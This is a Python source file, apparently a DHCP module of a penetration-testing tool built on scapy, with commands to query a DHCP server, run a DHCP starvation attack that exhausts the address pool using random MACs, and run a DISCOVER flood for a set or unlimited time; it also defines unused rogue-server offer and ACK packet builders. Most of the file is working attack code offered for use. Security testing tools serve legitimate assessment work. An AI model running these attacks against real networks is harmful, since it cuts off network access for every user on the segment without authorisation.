import argparse
import time
import ipaddress
import threading
from enum import Enum
from dataclasses import dataclass
from typing import Optional

from ptlibs.ptjsonlib import PtJsonLib

# DHCP dependencies
try:
    from dhcppython.utils import random_mac
    from scapy.layers.dhcp import BOOTP, DHCP
    from scapy.layers.l2 import Ether
    from scapy.layers.inet import IP, UDP
    from scapy.sendrecv import sendp, sniff
    DHCP_AVAILABLE = True
except ImportError:
    DHCP_AVAILABLE = False

from ._base import BaseModule, BaseArgs, Out


# Constants
MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"
IPv4_TYPE = 0x0800
BROADCAST_FLAG = 0x8000
IP_BROADCAST = "255.255.255.255"
DISCOVER_FILTER = "udp and src port 68 and dst port 67 and ether dst ff:ff:ff:ff:ff:ff"
REQUEST_FILTER = "udp and src port 68 and dst port 67"


class VULNS(Enum):
    DHCP_DOS = "PTV-DHCP-DOS"
    DHCP_STARVATION = "PTV-DHCP-STARVATION"
    DHCP_ROGUE = "PTV-DHCP-ROGUE"


@dataclass
class DHCPResults:
    info: Optional[dict] = None
    starvation: Optional[dict] = None
    denial: Optional[dict] = None
    server: Optional[dict] = None


# Helper functions
def mac_remove_colons(mac: str):
    return mac.replace(":", "")


def random_xid():
    import random
    return random.randint(0, 2**32-1)


def prepare_bootp(src_mac, dst_mac, sport, dport, src_ip, dst_ip, transaction_id):
    eth = Ether(src=src_mac, dst=dst_mac, type=IPv4_TYPE)
    ip = IP(src=src_ip, dst=dst_ip)
    udp = UDP(sport=sport, dport=dport)
    bootp = BOOTP(chaddr=bytes.fromhex(mac_remove_colons(src_mac)), xid=transaction_id)
    return eth / ip / udp / bootp


def prepare_discover_packet(src_mac, transaction_id):
    dhcp = DHCP(options=[("message-type", "discover"), "end"])
    return prepare_bootp(src_mac, MAC_BROADCAST, 68, 67, "0.0.0.0", IP_BROADCAST, transaction_id) / dhcp


def prepare_request_packet(src_mac, transaction_id, requested_ip):
    dhcp = DHCP(options=[("message-type", "request"), ("requested_addr", requested_ip), "end"])
    return prepare_bootp(src_mac, MAC_BROADCAST, 68, 67, "0.0.0.0", IP_BROADCAST, transaction_id) / dhcp


def prepare_offer_packet(src_mac, dst_mac, transaction_id, offered_ip, netmask, gateway, server_ip, lease, renew, rebind):
    dhcp = DHCP(options=[("message-type", "offer"),
                         ("requested_addr", offered_ip),
                         ("router", gateway),
                         ("subnet_mask", netmask),
                         ("server_id", server_ip),
                         ("lease_time", lease),
                         ("renewal_time", renew),
                         ("rebinding_time", rebind),
                         "end"])
    bootp = prepare_bootp(src_mac, MAC_BROADCAST, 67, 68, server_ip, IP_BROADCAST, transaction_id)
    bootp.getlayer(BOOTP).yiaddr = offered_ip
    bootp.getlayer(BOOTP).op = 2
    bootp.getlayer(BOOTP).flags = BROADCAST_FLAG
    bootp.getlayer(BOOTP).chaddr = bytes.fromhex(mac_remove_colons(dst_mac))
    return bootp / dhcp


def prepare_ack_packet(src_mac, dst_mac, transaction_id, offered_ip, netmask, gateway, server_ip, lease, renew, rebind):
    dhcp = DHCP(options=[("message-type", "ack"),
                         ("requested_addr", offered_ip),
                         ("router", gateway),
                         ("subnet_mask", netmask),
                         ("server_id", server_ip),
                         ("lease_time", lease),
                         ("renewal_time", renew),
                         ("rebinding_time", rebind),
                         "end"])
    bootp = prepare_bootp(src_mac, MAC_BROADCAST, 67, 68, server_ip, IP_BROADCAST, transaction_id)
    bootp.getlayer(BOOTP).yiaddr = offered_ip
    bootp.getlayer(BOOTP).op = 2
    bootp.getlayer(BOOTP).flags = BROADCAST_FLAG
    bootp.getlayer(BOOTP).chaddr = bytes.fromhex(mac_remove_colons(dst_mac))
    return bootp / dhcp


class DHCPArgs(BaseArgs):
    interface: str
    command: str
    timeout: int
    duration: int
    count: int
    start_ip: str
    end_ip: str
    netmask: str
    gateway: str
    server_ip: str
    lease_time: int
    renew_time: int
    rebind_time: int

    @staticmethod
    def get_help():
        return [
            {"description": ["DHCP Testing Module"]},
            {"usage": ["ptsrvtester dhcp <command> <options>"]},
            {"usage_example": [
                "ptsrvtester dhcp info --interface eth0",
                "ptsrvtester dhcp starve --interface eth0 --count 10",
                "ptsrvtester dhcp denial --interface eth0 --duration 30"
            ]},
            {"options": [
                ["info", "<options>", "", "Display DHCP server information"],
                ["starve", "<options>", "", "Run DHCP starvation attack"],
                ["denial", "<options>", "", "Run DHCP DoS attack"],
                ["", "", "", ""],
                ["-h", "--help", "", "Show this help message and exit"],
            ]}
        ]

    def add_subparser(self, name: str, subparsers) -> None:
        """Adds a subparser of DHCP arguments"""

        examples = """example usage:
  ptsrvtester dhcp info --interface eth0
  ptsrvtester dhcp starve --interface eth0 --count 10
  ptsrvtester dhcp denial --interface eth0 --duration 30"""

        parser = subparsers.add_parser(
            name,
            epilog=examples,
            add_help=True,
            formatter_class=argparse.RawTextHelpFormatter,
        )

        if not isinstance(parser, argparse.ArgumentParser):
            raise TypeError

        dhcp_subparsers = parser.add_subparsers(dest="command", help="Select DHCP command", required=True)

        # DHCP info
        dhcp_info = dhcp_subparsers.add_parser("info", help="Display DHCP server information")
        dhcp_info.add_argument("--interface", "-i", required=True, help="Network interface to use")
        dhcp_info.add_argument("--timeout", "-t", type=int, default=10, help="Timeout for DHCP offer reply (default: 10s)")

        # DHCP starvation
        dhcp_starve = dhcp_subparsers.add_parser("starve", help="Run DHCP starvation attack")
        dhcp_starve.add_argument("--interface", "-i", required=True, help="Network interface to use")
        dhcp_starve.add_argument("--count", "-c", type=int, help="Number of IP addresses to obtain (omit for unlimited)")

        # DHCP denial
        dhcp_denial = dhcp_subparsers.add_parser("denial", help="Run DHCP DoS flood attack")
        dhcp_denial.add_argument("--interface", "-i", required=True, help="Network interface to use")
        dhcp_denial.add_argument("--duration", "-d", type=int, help="Duration in seconds (omit for unlimited)")


class DHCP(BaseModule):
    @staticmethod
    def module_args() -> DHCPArgs:
        return DHCPArgs()

    def __init__(self, args: DHCPArgs, ptjsonlib: PtJsonLib):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.results = DHCPResults()

        if not DHCP_AVAILABLE:
            self.ptprint("ERROR: DHCP module requires 'scapy' and 'dhcppython' packages", Out.ERROR)
            self.ptprint("Install with: pip install scapy dhcppython", Out.INFO)
            raise ImportError("Missing required packages: scapy, dhcppython")

    def run(self) -> None:
        """Execute the selected DHCP command"""
        self.ptprint(f"Running DHCP {self.args.command} on interface {self.args.interface}", Out.TITLE, title=True)

        if self.args.command == "info":
            self._get_server_info()
        elif self.args.command == "starve":
            self._run_starvation()
        elif self.args.command == "denial":
            self._run_denial()

    def _get_server_info(self):
        """Retrieve DHCP server information"""
        self.ptprint("Retrieving DHCP server information...", Out.INFO)
        
        src_mac = random_mac()
        transaction_id = random_xid()
        offer_filter = f"udp and src port 67 and (ether dst ff:ff:ff:ff:ff:ff or ether dst {src_mac})"
        
        try:
            sendp(prepare_discover_packet(src_mac, transaction_id), self.args.interface, verbose=False)
            
            def is_offer_packet(packet):
                if packet.haslayer(DHCP):
                    options = packet[DHCP].options
                    self.ptprint("\n[+] DHCP Server Information:", Out.OK)
                    for o in range(1, len(options)):
                        if options[o] == "end":
                            break
                        option_str = str(options[o]).replace("(", "").replace(")", "").replace(",", ":\t").replace("'", "")
                        self.ptprint(f"    {option_str}", Out.TEXT)
                    return True
                return False
            
            res = sniff(iface=self.args.interface, filter=offer_filter, promisc=True, 
                       timeout=self.args.timeout, stop_filter=is_offer_packet)
            
            if len(res) == 0:
                self.ptprint("[-] No DHCP server information accessible", Out.WARNING)
        except Exception as e:
            self.ptprint(f"[-] Error retrieving DHCP information: {str(e)}", Out.ERROR)

    def _run_starvation(self):
        """Run DHCP starvation attack"""
        self.ptprint("Running DHCP starvation attack...", Out.WARNING)
        self.ptprint("Press Ctrl+C to stop", Out.INFO)
        
        try:
            count = 0
            max_count = self.args.count if hasattr(self.args, 'count') and self.args.count else None
            
            while max_count is None or count < max_count:
                src_mac = random_mac()
                transaction_id = random_xid()
                requested_ip = None
                
                # Send DISCOVER
                offer_filter = f"udp and src port 67 and (ether dst ff:ff:ff:ff:ff:ff or ether dst {src_mac})"
                sendp(prepare_discover_packet(src_mac, transaction_id), self.args.interface, verbose=False)
                
                # Wait for OFFER
                def is_offer(packet):
                    nonlocal requested_ip
                    if packet.haslayer(BOOTP) and packet[BOOTP].xid == transaction_id:
                        if packet[BOOTP].yiaddr != "0.0.0.0":
                            requested_ip = packet[BOOTP].yiaddr
                            return True
                    return False
                
                sniff(iface=self.args.interface, filter=offer_filter, promisc=True, 
                     timeout=10, stop_filter=is_offer)
                
                if requested_ip:
                    # Send REQUEST
                    sendp(prepare_request_packet(src_mac, transaction_id, requested_ip), 
                         self.args.interface, verbose=False)
                    self.ptprint(f"[+] Obtained {requested_ip} for {src_mac}", Out.OK)
                    count += 1
                else:
                    self.ptprint("[-] No OFFER received, server may be exhausted", Out.WARNING)
                    break
                    
        except KeyboardInterrupt:
            self.ptprint("\n[!] Starvation attack stopped by user", Out.INFO)
        except Exception as e:
            self.ptprint(f"[-] Error during starvation: {str(e)}", Out.ERROR)
            
        self.ptprint(f"[*] Total IPs obtained: {count}", Out.INFO)

    def _run_denial(self):
        """Run DHCP DoS flood attack"""
        self.ptprint("Running DHCP DoS flood attack...", Out.WARNING)
        self.ptprint("Press Ctrl+C to stop", Out.INFO)
        
        try:
            start_time = time.time()
            count = 0
            duration = self.args.duration if hasattr(self.args, 'duration') and self.args.duration else None
            
            while duration is None or (time.time() - start_time) < duration:
                sendp(prepare_discover_packet(random_mac(), random_xid()), 
                     iface=self.args.interface, verbose=False)
                count += 1
                
                if count % 100 == 0:
                    self.ptprint(f"[*] Sent {count} DISCOVER packets", Out.INFO)
                    
        except KeyboardInterrupt:
            self.ptprint("\n[!] DoS attack stopped by user", Out.INFO)
        except Exception as e:
            self.ptprint(f"[-] Error during DoS: {str(e)}", Out.ERROR)
            
        self.ptprint(f"[*] Total packets sent: {count}", Out.INFO)

    def output(self) -> None:
        """Output results in JSON format if requested"""
        if self.args.json:
            self.ptjsonlib.set_status("ok")
            # Add results to JSON output if needed
            self.ptprint(self.ptjsonlib.get_result_json(), Out.TEXT, json=True)
